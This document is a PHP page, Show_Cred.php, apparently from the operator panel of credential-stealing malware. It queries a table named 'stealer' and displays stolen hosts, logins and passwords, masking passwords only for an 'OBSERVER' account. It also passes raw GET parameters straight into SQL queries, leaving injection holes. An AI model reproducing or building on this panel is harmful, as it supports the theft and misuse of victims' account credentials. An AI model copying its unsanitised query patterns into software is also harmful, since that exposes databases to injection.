<?php
    
   session_start();

   error_reporting( 0 );

   if ( !( isset( $_SESSION['Name'] ) ) )
   {
      header( "Location: Login.php" );
      exit;
   }

   include( "Header.php" );
   include( "Cfg/Config.php" );
   include( "Cfg/Options.php" );
   include( "Functions.php" );

   $CCount = GetCredCount();

   if ( @mysql_connect( $conf['dbhost'], $conf['dbuser'], $conf['dbpass'] ) == false )
   {
      echo "SQL connection filed, check host, name, login and password";
      die;
   }

   mysql_select_db( $conf['dbname'] );

   if ( $_GET["f"] )
   { 
      $f = ( $_GET["f"] );
   }
   else
   {
      $f = 0;
   }

   if ( $_GET["sort"] == "" )
   {
      $so = "id";
      $J = "id";
   }
   else
   {
      $so = $_GET["sort"];
      $J = $_GET["sort"];
   }

   echo "<table cellpadding=0 cellspacing=0 width=\"100%\" style =\"border: 1px solid;\">
         <tr style=background-color:#11101d; height=\"50\">
            <td>
               <div align = center>
                  <font color=\"#E4E9F7\">" . $_SESSION['Name'] . ", " . $CCount . $lang["_010"].
                  "</font>
               </div>
            </td>
         </tr>
      </table>";

   sTable();
   
   $result = mysql_query( "SELECT * FROM stealer ORDER BY $J DESC LIMIT $f, 100" );
   $all = mysql_query( "SELECT * FROM stealer" );

   if ( $_GET["showid"] )
   {
      $result = mysql_query( 'SELECT * FROM stealer WHERE id = "' . $_GET["showid"] . '"' );
   }

   if ( $_GET["showsoft"] )
   {
      $result = mysql_query( 'SELECT * FROM stealer WHERE type = "' . $_GET["showsoft"] . '"' );
   }
   
   echo "<div align = center> 
            <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
               <tr height=\"35\">
                  <td><div align = center> <a href=\"Show_Cred.php?sort=id" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"Images\ic_sort.png\"></a>&nbsp;" . $lang["0034"] . ":</div></td>
                  <td><div align = center> <a href=\"Show_Cred.php?sort=type" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"Images\ic_sort.png\"></a>&nbsp;" . $lang["0054"] . ":</div></td>
                  <td><div align = center> <a href=\"Show_Cred.php?sort=host" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"Images\ic_sort.png\"></a>&nbsp;" . $lang["0089"] . ":</div></td>
                  <td><div align = center> <a href=\"Show_Cred.php?sort=login" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"Images\ic_sort.png\"></a>&nbsp;" . $lang["0090"]  . ":</div></td>
                  <td><div align = center> <a href=\"Show_Cred.php?sort=password" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"Images\ic_sort.png\"></a>&nbsp;" . $lang["0091"] . ":</div></td>
               </tr>";

   while ( $row = mysql_fetch_array( $result ) )
   { 
      $gb = GetBG();

      echo "<tr height=\"35\">
            <td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . "<a href=\"Show_Cred.php?showid=" . $row['id'] . "\">" . $row['id'] . "</a>" . "</td>
            <td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . "<a href=\"Show_Cred.php?showsoft=" . $row['type'] . "\">" . $row['type'] . "</a>" . "</td>
            <td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $row['host'] . "</td>
            <td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $row['login'] . "</td>";


      if ( $_SESSION['Name'] != "OBSERVER" )
      {
         echo "<td bgcolor = " . $gb . "><div align = left>" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $row['password'] . "</div></td>"; 
      }
      else
      {                     
         echo "<td bgcolor = " . $gb . "><div align = left>" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . "******" . "</div></td>";
      }

      echo "</tr>";
         
   }

   echo "   </table>
         </div>";


   echo "<div align = center>
            <table border=\"0\" width=\"98%\" class=table_hig cellspacing=\"0\" cellpadding=\"0\" height=\"20\">
         <tr>
      <td>
   <div align = right>";
  
   if ( $_GET["show"] == all )
   {
      $sa = "&show=all";
   }

   while ( mysql_num_rows( $all ) > $i0 )
   {    
      if ( mysql_num_rows( $all ) > $i0 ) 
      { 
         $total_pages++; 
      }

      $i0 = $i0 + 100;
   }

   $current_page = ($f / 100) + 1;

   if ($total_pages > 1)
   {
      echo "<div class=\"bblock1\"> " . $lang["0043"] . ": " . $current_page . "/" . $total_pages . "</div>";

      while ( mysql_num_rows( $all ) > $i )
      {    
         if ( mysql_num_rows( $all ) > $i ) 
         { 
            $c++;
            
            if ( mysql_num_rows( $all ) > 100 ) 
            {

                  if ( ($current_page - 15) < ( ($i / 100) + 1  ) && ($current_page + 15) > ( ($i / 100) + 1) && ( ($i / 100) + 1) <> $current_page ) 
                     echo "<div class=\"bblock1\"><a href=\"Show_Cred.php?sort=" . $so . "&f=" . $i . $sa . "\">" . $c . "</a></div>";

                  if ( ( ($i / 100) + 1  ) == $current_page )
                     echo "<div class=\"bblock2\"><a href=\"Show_Cred.php?sort=" . $so . "&f=" . $i . $sa . "\">" . $c . "</a></div>";
            }
         }

         $i = $i + 100;
      }
   }

   echo "           </div>
      </td>
         </tr>
            </table>
         </div>";

   include( "Footer.php" );

   mysql_close();
?>